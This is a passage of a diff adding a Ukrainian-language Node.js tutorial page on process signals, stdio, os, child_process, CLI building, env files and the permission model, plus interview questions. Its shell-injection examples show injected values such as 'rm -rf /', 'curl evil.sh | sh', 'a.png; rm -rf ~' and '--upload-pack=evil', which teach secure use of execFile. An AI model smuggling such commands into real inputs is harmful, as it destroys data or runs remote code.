+  if (shuttingDown) return;                 // другий Ctrl+C ігноруємо (або робимо force)
+  shuttingDown = true;
+  console.log(`got ${signal}, closing server...`);
+  server.close(async () =&gt; {                // 1. перестати приймати, дочекатись in-flight запитів
+    await db.end();                         // 2. закрити пули, черги, flush телеметрії
+    console.log('server closed, cleanup done');
+    process.exitCode = 0;                   // 3. процес вийде сам, коли loop спорожніє
+  });
+  server.closeIdleConnections();            // keep-alive сокети без запитів — закрити одразу
+  setTimeout(() =&gt; { console.log('force exit'); process.exit(1); }, 10_000).unref(); // страховка
+}
+process.on('SIGTERM', shutdown);
+process.on('SIGINT', shutdown);</code></pre>
+      </div>
+      <div class="codecard">
+        <div class="bar"><span class="path">output (батько шле SIGTERM, потім іншому дочірньому — SIGKILL)</span></div>
+        <pre><code>[child] SIGKILL listener: EINVAL
+[child] got SIGTERM, closing server...
+[child] server closed, cleanup done
+[parent] stubborn child code = null signal = SIGKILL     ← ігнорував SIGTERM, вбили -9
+[parent] child exit code = 0 signal = null               ← завершився сам, код 0</code></pre>
+      </div>
+      <ul>
+        <li><code>.unref()</code> на таймері-страховці: він не тримає процес живим, якщо все закрилося раніше.</li>
+        <li>У Kubernetes між SIGTERM і видаленням pod з endpoints є гонка: деякий час трафік ще може приходити. Тому часто
+        перші кілька секунд після SIGTERM readiness-probe повертає 503, а сервер ще приймає запити
+        (<a href="17-production-observability.html">туторіал 17</a>).</li>
+        <li><b>PID 1 у Docker:</b> якщо запустити <code>CMD npm start</code>, сигнал отримає npm, який історично не завжди
+        прокидав його дитині. Використовуйте <code>CMD ["node", "server.js"]</code> (exec-форма) і <code>--init</code>/tini, щоб
+        хтось збирав зомбі-процеси. Shell-форма <code>CMD node server.js</code> ставить PID 1 = <code>sh</code>.</li>
+        <li>На Windows сигналів у POSIX-сенсі немає: Node емулює SIGINT (Ctrl+C) і SIGBREAK; <code>kill('SIGTERM')</code> просто вбиває.</li>
+      </ul>
+
+      <h3>stdin, stdout, stderr — це стріми</h3>
+      <ul>
+        <li><code>process.stdout</code>/<code>stderr</code> — Writable, <code>process.stdin</code> — Readable. Отже,
+        <code>process.stdin.pipe(transform).pipe(process.stdout)</code> — валідна Unix-утиліта.</li>
+        <li>Синхронність запису залежить від типу: файли — синхронно; TTY — синхронно на Linux/macOS; <b>pipes і сокети — асинхронно
+        на Linux</b> (звідси і обрізаний вивід у s8).</li>
+        <li><code>console.log</code> → stdout, <code>console.error</code> → stderr. Дані — у stdout, діагностика — у stderr:
+        тоді <code>mytool | jq</code> працює, а помилки видно в терміналі.</li>
+        <li><code>process.stdout.isTTY</code> — <code>true</code>, якщо вивід у термінал (тоді доречні кольори й прогрес-бари);
+        у pipe/файл — <code>undefined</code>.</li>
+        <li><code>EPIPE</code>: <code>mytool | head -1</code> — head закрився, наступний write падає. CLI мають це тихо ігнорувати.</li>
+      </ul>
+    </section>
+
+    <section id="s10">
+      <h2><span class="num">10</span> Модуль os</h2>
+      <p class="section-desc">Інформація про машину: скільки ядер, пам'яті, де temp-директорія, які мережеві інтерфейси.</p>
+
+      <div class="codecard">
+        <div class="bar"><span class="path">os.js</span></div>
+        <pre><code>const os = require('node:os');
+
+os.cpus().length;            // 16 — логічні ядра хоста (з моделлю й часами кожного)
+os.availableParallelism();   // 16 — рекомендована кількість паралельних задач (Node 18.14+)
+os.totalmem(); os.freemem(); // байти
+os.EOL;                      // '\n' (POSIX) або '\r\n' (Windows)
+os.tmpdir();                 // '/var/folders/.../T' на macOS, '/tmp' на Linux
+os.platform(); os.arch(); os.type(); os.release();
+os.networkInterfaces();      // { lo0: [...], en0: [{ address, family, internal, mac }] }
+os.loadavg();                // [1, 5, 15]-хвилинне навантаження (на Windows — нулі)
+os.homedir(); os.hostname(); os.userInfo();
+os.constants.signals.SIGTERM; // 15</code></pre>
+      </div>
+      <div class="callout warn"><div class="ic">⚠️</div><div class="body"><b>Контейнери:</b> <code>os.cpus().length</code> і
+      <code>os.totalmem()</code> історично показують ресурси <b>хоста</b>, а не ліміти cgroup. Pod з <code>cpu: 2</code> на 64-ядерній
+      ноді отримає 64 — і запустить 64 cluster-воркери, які задушать один одного. <code>availableParallelism()</code> краще
+      (враховує CPU affinity), а для пам'яті — <code>process.constrainedMemory()</code> (cgroup-ліміт). Надійніше —
+      явно задати кількість воркерів через env.</div></div>
+      <p>Для тимчасових файлів — <code>fs.mkdtemp(path.join(os.tmpdir(), 'myapp-'))</code> (унікальна директорія, без колізій між
+      процесами) і прибирання в <code>finally</code>.</p>
+    </section>
+
+    <section id="s11">
+      <h2><span class="num">11</span> child_process</h2>
+      <p class="section-desc">Чотири функції для запуску процесів відрізняються трьома речами: чи є shell, чи буферизується вивід, чи є IPC-канал.</p>
+
+      <table>
+        <tr><th>Функція</th><th>Shell?</th><th>Вивід</th><th>IPC</th><th>Для чого</th></tr>
+        <tr><td><code>spawn(cmd, args)</code></td><td>ні (опц. <code>shell: true</code>)</td><td><b>стріми</b> stdout/stderr</td><td>опційно</td><td>довгі процеси, великий вивід (ffmpeg, git clone)</td></tr>
+        <tr><td><code>execFile(file, args, cb)</code></td><td>ні</td><td>буфер у пам'ять (<code>maxBuffer</code> 1 MB)</td><td>ні</td><td>коротка команда з невеликим виводом, безпечні аргументи</td></tr>
+        <tr><td><code>exec(command, cb)</code></td><td><b>так</b> (<code>/bin/sh -c</code>)</td><td>буфер у пам'ять</td><td>ні</td><td>shell-фічі: pipes, glob, <code>&amp;&amp;</code> — з ДОВІРЕНИМ рядком</td></tr>
+        <tr><td><code>fork(modulePath)</code></td><td>ні</td><td>успадкований stdio</td><td><b>так</b>, завжди</td><td>інший Node-скрипт з <code>send()</code>/<code>'message'</code></td></tr>
+      </table>
+      <p class="muted">Кожна має sync-версію (<code>spawnSync</code>, <code>execSync</code>, <code>execFileSync</code>) — блокують event loop,
+      доречні в скриптах і на старті. Промісні версії: <code>util.promisify(execFile)</code> → <code>{ stdout, stderr }</code>.</p>
+
+      <figure class="diagram">
+        <svg viewBox="0 0 740 330" role="img" aria-label="Батьківський Node-процес і чотири варіанти запуску. exec запускає /bin/sh, який інтерпретує рядок і запускає команду, вивід накопичується у буфер і повертається в колбек. execFile запускає програму напряму без shell, вивід теж буферизується. spawn запускає програму напряму, stdout і stderr доступні як стріми. fork запускає новий процес node з додатковим IPC-каналом, через який ходять повідомлення send і message.">
+          <defs><marker id="n07d3-arrow" viewBox="0 0 10 10" refX="8" refY="5" markerWidth="6" markerHeight="6" orient="auto-start-reverse"><path d="M0,0 L10,5 L0,10 z" fill="currentColor"/></marker></defs>
+          <g font-size="12">
+            <rect x="20" y="120" width="140" height="80" rx="10" fill="var(--accent-soft)" stroke="var(--accent)" stroke-width="1.4"/>
+            <text x="90" y="155" text-anchor="middle" fill="var(--accent)" font-weight="bold">Батько</text>
+            <text x="90" y="174" text-anchor="middle" fill="currentColor">node app.js</text>
+
+            <text x="230" y="38" fill="var(--warn)">exec('ls *.log | wc -l')</text>
+            <rect x="380" y="22" width="90" height="28" rx="6" fill="none" stroke="var(--warn)" stroke-width="1.3"/>
+            <text x="425" y="41" text-anchor="middle" fill="var(--warn)">/bin/sh -c</text>
+            <rect x="500" y="22" width="80" height="28" rx="6" fill="none" stroke="currentColor"/>
+            <text x="540" y="41" text-anchor="middle" fill="currentColor">ls, wc</text>
+            <line x1="470" y1="36" x2="497" y2="36" stroke="currentColor" marker-end="url(#n07d3-arrow)"/>
+            <rect x="610" y="22" width="110" height="28" rx="6" fill="var(--bg-soft)" stroke="currentColor"/>
+            <text x="665" y="41" text-anchor="middle" fill="currentColor">буфер → cb</text>
+            <line x1="580" y1="36" x2="607" y2="36" stroke="currentColor" marker-end="url(#n07d3-arrow)"/>
+
+            <text x="230" y="108" fill="currentColor">execFile('git', ['log'])</text>
+            <rect x="500" y="92" width="80" height="28" rx="6" fill="none" stroke="currentColor"/>
+            <text x="540" y="111" text-anchor="middle" fill="currentColor">git</text>
+            <rect x="610" y="92" width="110" height="28" rx="6" fill="var(--bg-soft)" stroke="currentColor"/>
+            <text x="665" y="111" text-anchor="middle" fill="currentColor">буфер → cb</text>
+            <line x1="580" y1="106" x2="607" y2="106" stroke="currentColor" marker-end="url(#n07d3-arrow)"/>
+
+            <text x="230" y="178" fill="var(--good)">spawn('ffmpeg', [...])</text>
+            <rect x="500" y="162" width="80" height="28" rx="6" fill="none" stroke="var(--good)"/>
+            <text x="540" y="181" text-anchor="middle" fill="var(--good)">ffmpeg</text>
+            <rect x="610" y="155" width="110" height="20" rx="4" fill="none" stroke="var(--good)"/>
+            <text x="665" y="169" text-anchor="middle" fill="var(--good)">stdout stream</text>
+            <rect x="610" y="179" width="110" height="20" rx="4" fill="none" stroke="var(--good)"/>
+            <text x="665" y="193" text-anchor="middle" fill="var(--good)">stderr stream</text>
+            <line x1="580" y1="176" x2="607" y2="176" stroke="var(--good)" marker-end="url(#n07d3-arrow)"/>
+
+            <text x="230" y="258" fill="var(--info)">fork('./worker.js')</text>
+            <rect x="500" y="240" width="80" height="32" rx="6" fill="none" stroke="var(--info)"/>
+            <text x="540" y="261" text-anchor="middle" fill="var(--info)">node</text>
+            <rect x="610" y="240" width="110" height="32" rx="6" fill="none" stroke="var(--info)" stroke-dasharray="4,3"/>
+            <text x="665" y="261" text-anchor="middle" fill="var(--info)">stdio: inherit</text>
+            <path d="M540,274 C540,310 100,310 90,204" fill="none" stroke="var(--info)" stroke-width="1.4" marker-start="url(#n07d3-arrow)" marker-end="url(#n07d3-arrow)"/>
+            <text x="330" y="318" text-anchor="middle" fill="var(--info)">IPC-канал: send(obj) ⇄ 'message' (JSON / advanced serialization)</text>
+
+            <line x1="160" y1="140" x2="225" y2="40" stroke="var(--fg-muted)" stroke-width="1"/>
+            <line x1="160" y1="150" x2="225" y2="105" stroke="var(--fg-muted)" stroke-width="1"/>
+            <line x1="160" y1="170" x2="225" y2="175" stroke="var(--fg-muted)" stroke-width="1"/>
+            <line x1="160" y1="190" x2="225" y2="252" stroke="var(--fg-muted)" stroke-width="1"/>
+          </g>
+        </svg>
+        <figcaption>Лише exec іде через shell (і тому вразливий до injection); лише spawn віддає вивід стрімами; лише fork має IPC за замовчуванням.</figcaption>
+      </figure>
+
+      <h3>Shell injection</h3>
+      <div class="codecard">
+        <div class="bar"><span class="path">injection.js</span></div>
+        <pre><code>const { exec, execFile } = require('node:child_process');
+const userInput = 'report.txt; echo HACKED';     // уявіть: rm -rf / або curl evil.sh | sh
+
+exec(`echo processing ${userInput}`, (err, stdout) =&gt; console.log('[exec]    ', JSON.stringify(stdout)));
+execFile('echo', ['processing', userInput], (err, stdout) =&gt; console.log('[execFile]', JSON.stringify(stdout)));
+
+// [exec]     "processing report.txt\nHACKED\n"          ← shell виконав ДРУГУ команду
+// [execFile] "processing report.txt; echo HACKED\n"    ← один аргумент, буквально</code></pre>
+      </div>
+      <div class="callout bad"><div class="ic">🔓</div><div class="body"><b>Правило:</b> ніколи не підставляйте зовнішні дані в
+      рядок для <code>exec</code>/<code>execSync</code> або <code>spawn(..., { shell: true })</code>. Використовуйте
+      <code>execFile</code>/<code>spawn</code> з масивом аргументів — тоді <code>;</code>, <code>|</code>, <code>$()</code>, бектики
+      не мають спецзначення. Але й тут лишається <b>argument injection</b>: <code>userInput = '--upload-pack=evil'</code> для git.
+      Ставте <code>'--'</code> перед позиційними аргументами і валідуйте за allowlist. На Windows <code>.bat</code>/<code>.cmd</code>
+      завжди запускаються через cmd.exe — окремий клас вразливостей (саме тому Node у 2024 заборонив їх спавн без
+      <code>shell: true</code>).</div></div>
+
+      <h3>spawn: стріми й stdio</h3>
+      <div class="codecard">
+        <div class="bar"><span class="path">spawn.js</span></div>
+        <pre><code>const { spawn } = require('node:child_process');
+const p = spawn('node', ['-e', 'for (let i=0;i&lt;3;i++) console.log("line", i); console.error("warn!"); process.exit(2)']);
+p.stdout.on('data', (d) =&gt; process.stdout.write('[spawn stdout] ' + d));
+p.stderr.on('data', (d) =&gt; process.stdout.write('[spawn stderr] ' + d));
+p.on('close', (code) =&gt; console.log('[spawn] exit code', code));
+
+// [spawn stdout] line 0
+// [spawn stdout] line 1
+// line 2                    ← "line 1\nline 2\n" прийшли ОДНИМ chunk-ом: chunk ≠ рядок!
+// [spawn stderr] warn!
+// [spawn] exit code 2</code></pre>
+      </div>
+      <ul>
+        <li><code>stdio: 'pipe'</code> (default) — батько отримує стріми; <code>'inherit'</code> — дитина пише прямо в термінал батька
+        (для <code>npm install</code> з прогрес-баром); <code>'ignore'</code> — у /dev/null. Можна масивом:
+        <code>['ignore', 'pipe', 'inherit', 'ipc']</code>.</li>
+        <li><b>Пастка:</b> з <code>'pipe'</code> ви <b>мусите</b> читати stdout/stderr. Якщо дитина пише багато, а ви не читаєте, —
+        pipe-буфер ОС (~64 KB) заповниться, дитина заблокується на write і "зависне" назавжди.</li>
+        <li><code>'exit'</code> vs <code>'close'</code>: exit — процес завершився, close — і всі його stdio-стріми закриті (вивід дочитано).
+        Для обробки виводу чекайте <code>'close'</code>.</li>
+        <li><code>'error'</code> — процес не вдалося <i>запустити</i> (ENOENT — немає такої програми). Без слухача — падіння (s3 туторіалу 6).</li>
+        <li><code>execFile</code>-сімейство має <code>timeout</code>, <code>maxBuffer</code> (перевищення → <code>ERR_CHILD_PROCESS_STDIO_MAXBUFFER</code>,
+        перевірено), <code>signal</code> (AbortController), <code>cwd</code>, <code>env</code>.</li>
+      </ul>
+
+      <h3>fork + IPC</h3>
+      <div class="codecard">
+        <div class="bar"><span class="path">fork-parent.js / fork-child.js</span></div>
+        <pre><code>// parent
+const child = fork('./fork-child.js');
+child.on('message', (m) =&gt; { console.log('[parent] got', m); child.disconnect(); });
+child.send({ cmd: 'sum', nums: [1, 2, 3, 4] });
+child.on('exit', (c) =&gt; console.log('[parent] child exited', c));
+
+// child
+process.on('message', (m) =&gt; {
+  if (m.cmd === 'sum') process.send({ result: m.nums.reduce((a, b) =&gt; a + b, 0) });
+});
+process.on('disconnect', () =&gt; console.log('[child] IPC closed, exiting'));
+
+// [parent] got { result: 10 }
+// [child] IPC closed, exiting       ← відкритий IPC-канал тримає дитину живою; disconnect() відпускає
+// [parent] child exited 0</code></pre>
+      </div>
+      <p>Повідомлення серіалізуються в JSON (або <code>serialization: 'advanced'</code> — structured clone з Map, Set, BigInt, Buffer).
+      Кожна дитина — окремий V8 і ~30–50 MB RSS. Для CPU-паралелізму всередині одного сервісу сучасніший вибір — worker_threads
+      (<a href="08-concurrency-scaling.html">туторіал 8</a>).</p>
+
+      <h3>Вбити дерево процесів і detached</h3>
+      <div class="codecard">
+        <div class="bar"><span class="path">kill-tree.js</span></div>
+        <pre><code>// shell запускає дві "онуки"; kill() вбиває лише shell
+const a = spawn('sh', ['-c', 'sleep 77 &amp; sleep 77 &amp; wait']);
+a.kill('SIGTERM');
+// after child.kill(): 2 sleep processes still alive     ← сироти, переїхали до init
+
+// detached: true → дитина стає лідером НОВОЇ групи процесів (POSIX setsid)
+const b = spawn('sh', ['-c', 'sleep 77 &amp; sleep 77 &amp; wait'], { detached: true, stdio: 'ignore' });
+process.kill(-b.pid, 'SIGTERM');                          // мінус = вся група
+// after process.kill(-pid): 0 sleep processes alive</code></pre>
+      </div>
+      <ul>
+        <li><code>detached: true</code> + <code>child.unref()</code> + <code>stdio: 'ignore'</code> — запустити фоновий процес, який переживе
+        батька (демон). Без <code>unref</code> батько чекатиме на дитину.</li>
+        <li>На Windows групи процесів працюють інакше; там використовують <code>taskkill /pid N /T /F</code> (пакет <code>tree-kill</code>).</li>
+        <li>Коли падає батько, діти <b>не</b> вмирають автоматично (на Linux). Тому в тест-раннерах і dev-серверах "висять" процеси — потрібне
+        явне прибирання на <code>'exit'</code>/SIGTERM.</li>
+      </ul>
+    </section>
+
+    <section id="s12">
+      <h2><span class="num">12</span> Пишемо CLI</h2>
+      <p class="section-desc">Сучасний Node дає майже все для CLI з коробки: парсер аргументів, промпти, кольори — без commander і chalk.</p>
+
+      <div class="tree"><span class="d">deploy-cli/</span>
+├── package.json    <span class="c"># "bin": { "deploy": "./cli.mjs" }</span>
+└── cli.mjs         <span class="c"># перший рядок: #!/usr/bin/env node; chmod +x</span></div>
+
+      <div class="codecard">
+        <div class="bar"><span class="path">package.json</span></div>
+        <pre><code>{
+  "name": "@acme/deploy-cli",
+  "type": "module",
+  "bin": { "deploy": "./cli.mjs" },
+  "engines": { "node": "&gt;=20" }
+}</code></pre>
+      </div>
+      <p><code>npm install -g</code> (або <code>npx @acme/deploy-cli</code>, або локально — <code>node_modules/.bin/deploy</code>) створює
+      symlink з <code>bin</code>; на Windows npm генерує <code>.cmd</code>-обгортку. Shebang <code>#!/usr/bin/env node</code> шукає
+      <code>node</code> у <code>PATH</code> — працює з nvm/volta. Деталі пакування — <a href="05-npm-packages.html">туторіал 5</a>.</p>
+
+      <div class="codecard">
+        <div class="bar"><span class="path">cli.mjs</span></div>
+        <pre><code>#!/usr/bin/env node
+import { parseArgs, styleText } from 'node:util';
+import { createInterface } from 'node:readline/promises';
+import { stdin, stdout, stderr } from 'node:process';
+
+const { values, positionals } = parseArgs({
+  allowPositionals: true,
+  options: {
+    env:    { type: 'string', short: 'e', default: 'dev' },
+    dryRun: { type: 'boolean', default: false },
+    tag:    { type: 'string', multiple: true },
+    help:   { type: 'boolean', short: 'h' },
+  },
+});   // strict за замовчуванням: невідомий прапор → TypeError ERR_PARSE_ARGS_UNKNOWN_OPTION
+
+if (values.help) { console.log('usage: deploy [--env prod] [--dryRun] &lt;service&gt;'); process.exit(0); }
+const [service] = positionals;
+if (!service) {
+  stderr.write(styleText('red', 'error: service is required\n'));
+  process.exitCode = 2;                       // 2 = помилка використання
+} else {
+  console.log(values, positionals);
+  const rl = createInterface({ input: stdin, output: stdout });
+  const answer = await rl.question(`Deploy ${styleText(['bold', 'yellow'], service)} to ${values.env}? (y/N) `);
+  rl.close();
+  if (answer.trim().toLowerCase() !== 'y') { console.log(styleText('gray', 'aborted')); process.exitCode = 1; }
+  else console.log(styleText('green', '✔ deployed'));
+}</code></pre>
+      </div>
+      <div class="codecard">
+        <div class="bar"><span class="path">terminal</span></div>
+        <pre><code>$ echo y | node cli.mjs api -e prod --tag a --tag b --dryRun; echo "status=$?"
+[Object: null prototype] { env: 'prod', tag: [ 'a', 'b' ], dryRun: true } [ 'api' ]
+Deploy api to prod? (y/N) ✔ deployed
+status=0
+$ node cli.mjs; echo "status=$?"
+error: service is required
+status=2
+$ echo n | node cli.mjs web; echo "status=$?"
+[Object: null prototype] { env: 'dev', dryRun: false } [ 'web' ]
+Deploy web to dev? (y/N) aborted
+status=1</code></pre>
+      </div>
+      <ul>
+        <li><code>util.styleText</code> у свіжих версіях сам перевіряє, чи стрім — TTY, і поважає <code>NO_COLOR</code>/<code>FORCE_COLOR</code>:
+        у pipe ми отримали <code>"x"</code>, з <code>FORCE_COLOR=1</code> — <code>"\u001b[31mx\u001b[39m"</code> (перевірено).</li>
+        <li>Promts робіть лише, якщо <code>stdin.isTTY</code>; в CI додавайте прапор <code>--yes</code>, інакше скрипт зависне на питанні.</li>
+        <li>Результат — у stdout (можна пайпити), прогрес і помилки — у stderr; коди виходу: 0 / 1 / 2.</li>
+        <li>Для складних CLI з підкомандами й автодоповненням лишаються <code>commander</code>/<code>yargs</code>/<code>citty</code>;
+        для інтерактивних меню — <code>@inquirer/prompts</code> або <code>@clack/prompts</code>.</li>
+      </ul>
+    </section>
+
+    <section id="s13">
+      <h2><span class="num">13</span> --env-file, --watch, permission model</h2>
+      <p class="section-desc">Три вбудовані фічі, які замінили dotenv, nodemon і частково — пісочниці.</p>
+
+      <h3>--env-file і process.loadEnvFile</h3>
+      <div class="codecard">
+        <div class="bar"><span class="path">terminal</span></div>
+        <pre><code>$ cat .env
+DB_URL=postgres://localhost/app
+# comment
+PORT=3000
+GREETING="hello world"
+
+$ node --env-file=.env -p "process.env.PORT + ' ' + process.env.GREETING + ' ' + typeof process.env.PORT"
+3000 hello world string
+$ node -e "process.loadEnvFile('.env'); console.log(process.env.DB_URL)"   # програмно
+postgres://localhost/app
+$ node --env-file=.nope -p 1
+node: .nope: not found                                     # обов'язковий файл
+$ node --env-file-if-exists=.nope -p "'ok'"
+.nope not found. Continuing without it.                    # опційний
+ok</code></pre>
+      </div>
+      <p>Можна кілька <code>--env-file</code> (наступні перекривають попередні), а реальні змінні середовища мають пріоритет над файлом.
+      Немає інтерполяції <code>${VAR}</code> і валідації — це лише завантаження; схему перевіряйте окремо
+      (<a href="13-typescript-validation-config.html">туторіал 13</a>). Не комітьте <code>.env</code> з секретами.</p>
+
+      <h3>--watch</h3>
+      <p><code>node --watch server.js</code> перезапускає процес при зміні точки входу і всіх модулів, які вона імпортувала (Node будує граф
+      залежностей). <code>--watch-path=./src</code> — стежити за директорією; <code>--watch-preserve-output</code> — не чистити консоль.
+      Для dev-сервера цього достатньо замість nodemon; для monorepo з багатьма процесами — tsx/nodemon/turbo.</p>
+
+      <h3>Permission model</h3>
+      <div class="codecard">
+        <div class="bar"><span class="path">terminal</span></div>
+        <pre><code>$ node --permission --allow-fs-read=$PWD perm.js        # perm.js читає /etc/hosts
+Error: Access to this API has been restricted. Use --allow-fs-read to manage permissions.
+  code: 'ERR_ACCESS_DENIED',
+  permission: 'FileSystemRead',
+
+$ node --permission --allow-fs-read=$PWD -e "console.log(
+    process.permission.has('fs.read', '/etc/hosts'),
+    process.permission.has('fs.read', process.cwd()),
+    process.permission.has('child'))"
+false true false</code></pre>
+      </div>
+      <ul>
+        <li><code>--permission</code> (раніше <code>--experimental-permission</code>; стабільна в Node 23.5+/22.13+) за замовчуванням забороняє: fs-читання і запис,
+        child_process, worker_threads, нативні аддони, WASI, інспектор. Дозволи: <code>--allow-fs-read</code>, <code>--allow-fs-write</code>,
+        <code>--allow-child-process</code>, <code>--allow-worker</code>, <code>--allow-addons</code>, <code>--allow-wasi</code>. Мережа в Node 24 цією моделлю ще не обмежується — перевіряйте <code>node --help</code> своєї версії.</li>
+        <li>Це <b>"seat belt", а не sandbox</b>: захищає від випадкового або compromised-залежністю доступу, але не від зловмисного коду, що вже
+        має виконання (симлінки, вже відкриті fd, нативний код). Для справжньої ізоляції — контейнери, seccomp, окремі користувачі ОС.</li>
+        <li>Реальний кейс: запускати сторонні скрипти/плагіни/міграції з мінімальними правами і бачити в помилках, куди вони намагаються лізти.</li>
+      </ul>
+
+      <div class="decision">
+        <div class="decision-title">🔀 Вузол вибору: вбудоване чи пакет</div>
+        <table><tr><th>Задача</th><th>Вбудоване</th><th>Пакет, коли вбудованого мало</th></tr>
+          <tr><td>.env</td><td><code>--env-file</code>, <code>process.loadEnvFile</code></td><td><code>dotenv-expand</code> (інтерполяція), конфіг-бібліотеки зі схемою</td></tr>
+          <tr><td>Перезапуск при змінах</td><td><code>node --watch</code></td><td>nodemon (кастомні правила), tsx watch</td></tr>
+          <tr><td>Аргументи CLI</td><td><code>util.parseArgs</code></td><td>commander/yargs (підкоманди, help, completion)</td></tr>
+          <tr><td>Кольори</td><td><code>util.styleText</code></td><td>chalk/picocolors (старі версії Node)</td></tr>
+          <tr><td>Glob</td><td><code>fs.glob</code> (свіжі версії)</td><td>fast-glob, tinyglobby</td></tr>
+          <tr><td>Обмеження доступу</td><td><code>--permission</code></td><td>контейнер / окремий користувач ОС</td></tr></table>
+        <p><b>Коли що:</b> для нових сервісів і утиліт починайте з вбудованого — менше залежностей = менша supply-chain поверхня
+        (<a href="14-security.html">туторіал 14</a>); пакет — коли впираєтесь у конкретне обмеження.</p>
+      </div>
+    </section>
+
+    <section id="s14">
+      <h2><span class="num">14</span> Каверзні питання співбесіди</h2>
+      <p class="section-desc">Тут відрізняються ті, хто деплоїв Node у продакшен, від тих, хто лише писав роути.</p>
+
+      <details class="qa">
+        <summary><span class="difficulty core">База</span>Коли fs.readFileSync — це нормально?</summary>
+        <div class="a">На старті (до <code>listen</code>) і в CLI/скриптах: блокувати нікого, код простіший, помилка рано. Ніколи — в коді, що
+        виконується на кожен запит: блокує весь event loop.</div>
+      </details>
+      <details class="qa">
+        <summary><span class="difficulty trick">Пастка</span>path.join('a', '/b') vs path.resolve('a', '/b')?</summary>
+        <div class="a"><code>join</code> → <code>'a/b'</code> (просто сегменти). <code>resolve</code> → <code>'/b'</code>: іде справа наліво до першого
+        абсолютного сегмента; без абсолютного — додає <code>process.cwd()</code>. Жоден з них не захищає від <code>../</code> у
+        користувацькому вводі — потрібна перевірка префікса після resolve.</div>
+      </details>
+      <details class="qa">
+        <summary><span class="difficulty trick">Пастка</span>Чому process.exitCode краще за process.exit()?</summary>
+        <div class="a"><code>exit()</code> завершує негайно: асинхронні записи в stdout-pipe, незакриті з'єднання, проміси — відкидаються.
+        Ми бачили: з 5 MB виводу в pipe дійшло 131 072 байти. <code>exitCode</code> лише задає код — процес вийде сам, коли loop спорожніє.
+        <code>exit()</code> — тільки як force-exit за таймаутом.</div>
+      </details>
+      <details class="qa">
+        <summary><span class="difficulty core">База</span>Як реалізувати graceful shutdown?</summary>
+        <div class="a">На <code>SIGTERM</code>/<code>SIGINT</code>: перестати приймати (<code>server.close()</code>, readiness → 503), дочекатися in-flight
+        запитів, закрити idle keep-alive, закрити пули БД/черги, flush логів і метрик, встановити <code>exitCode</code>. Страховка —
+        <code>setTimeout(() =&gt; process.exit(1), N).unref()</code> менше за grace period оркестратора.</div>
+      </details>
+      <details class="qa">
+        <summary><span class="difficulty trick">Пастка</span>Чи можна перехопити SIGKILL?</summary>
+        <div class="a">Ні. <code>process.on('SIGKILL')</code> кидає EINVAL; ядро вбиває процес без попередження. Те ж з SIGSTOP. Тому
+        cleanup має завершитися в вікні після SIGTERM. Exit code у оболонці — 137.</div>
+      </details>
+      <details class="qa">
+        <summary><span class="difficulty core">База</span>spawn vs exec vs execFile vs fork?</summary>
+        <div class="a">exec — через shell, вивід у буфер; execFile — без shell, буфер; spawn — без shell, стріми (великий/довгий вивід);
+        fork — Node-скрипт з IPC (<code>send</code>/<code>'message'</code>). Лише exec (і <code>shell: true</code>) інтерпретує рядок shell-ом.</div>
+      </details>
+      <details class="qa">
+        <summary><span class="difficulty trick">Пастка</span>Чим небезпечний exec(`convert ${file}`)?</summary>
+        <div class="a">Shell injection: <code>file = 'a.png; rm -rf ~'</code> виконає другу команду. Лікування — <code>execFile('convert', [file])</code>,
+        <code>'--'</code> перед позиційними аргументами, allowlist значень. Масив аргументів знімає shell-метасимволи, але не argument injection.</div>
+      </details>
+      <details class="qa">
+        <summary><span class="difficulty trick">Пастка</span>Чому дочірній процес "завис" без жодної помилки?</summary>
+        <div class="a">Найчастіше: <code>stdio: 'pipe'</code>, а батько не читає stdout/stderr. Pipe-буфер ОС (~64 KB) заповнився, дитина
+        заблокувалась на write. Або відкритий IPC-канал fork тримає її живою — потрібен <code>disconnect()</code>.</div>
+      </details>
+      <details class="qa">
+        <summary><span class="difficulty core">База</span>Як убити процес разом з його нащадками?</summary>
+        <div class="a"><code>child.kill()</code> вбиває лише прямого нащадка — онуки стають сиротами. На POSIX: <code>spawn(..., { detached: true })</code>
+        (нова група процесів) і <code>process.kill(-child.pid, 'SIGTERM')</code>. На Windows — <code>taskkill /T /F</code>.</div>
+      </details>
+      <details class="qa">
+        <summary><span class="difficulty trick">Пастка</span>Exit code 137 / 143 / 130?</summary>
+        <div class="a">128 + номер сигналу: 137 = SIGKILL (часто OOMKilled або не вклались у grace period), 143 = SIGTERM (вас зупинили і ви не
+        перехопили сигнал), 130 = SIGINT (Ctrl+C).</div>
+      </details>
+      <details class="qa">
+        <summary><span class="difficulty trick">Пастка</span>Чому в Docker Node не реагує на docker stop?</summary>
+        <div class="a">Процес — PID 1, а для PID 1 ядро не застосовує дії за замовчуванням для сигналів — без явного обробника SIGTERM нічого
+        не станеться, і через 10 с прийде SIGKILL. Або сигнал отримує <code>sh</code>/<code>npm</code> і не прокидає. Рішення: exec-форма
+        <code>CMD ["node", "server.js"]</code>, явний обробник SIGTERM, <code>--init</code>/tini.</div>
+      </details>
+      <details class="qa">
+        <summary><span class="difficulty core">База</span>Як атомарно перезаписати файл?</summary>
+        <div class="a">Записати в temp-файл у тій самій директорії (та сама ФС), <code>fsync</code>, закрити, <code>rename</code> поверх цільового.
+        Читачі бачать або старий, або новий вміст. rename між різними ФС дає EXDEV.</div>
+      </details>
+      <details class="qa">
+        <summary><span class="difficulty trick">Пастка</span>os.cpus().length у контейнері з лімітом 2 CPU?</summary>
+        <div class="a">Може повернути кількість ядер хоста (64), бо cgroup quota не змінює видимих CPU. Краще
+        <code>os.availableParallelism()</code> і явна конфігурація кількості воркерів; пам'ять — <code>process.constrainedMemory()</code>.</div>
+      </details>
+      <details class="qa">
+        <summary><span class="difficulty core">База</span>Чи є --permission повноцінною пісочницею?</summary>
+        <div class="a">Ні — це запобіжник проти випадкового/компрометованого доступу (fs, child_process, workers, addons). Не захищає від
+        зловмисного коду з повним виконанням. Ізоляція — контейнери, окремий користувач ОС, seccomp.</div>
+      </details>
+    </section>
+
+    <section id="s15">
+      <h2><span class="num">15</span> Шпаргалка</h2>
+      <p class="section-desc">Найчастіші виклики й правила.</p>
+      <div class="cheat"><table>
+        <tr><th>Задача</th><th>Як</th></tr>
+        <tr><td>Прочитати файл</td><td><code>await readFile(p, 'utf8')</code> з <code>node:fs/promises</code>; великий — стрім</td></tr>
+        <tr><td>Атомарний запис</td><td>temp у тій самій dir → <code>fh.sync()</code> → <code>rename</code></td></tr>
+        <tr><td>mkdir -p / rm -rf / cp -r</td><td><code>mkdir(p, {recursive})</code> / <code>rm(p, {recursive, force})</code> / <code>cp(a, b, {recursive})</code></td></tr>
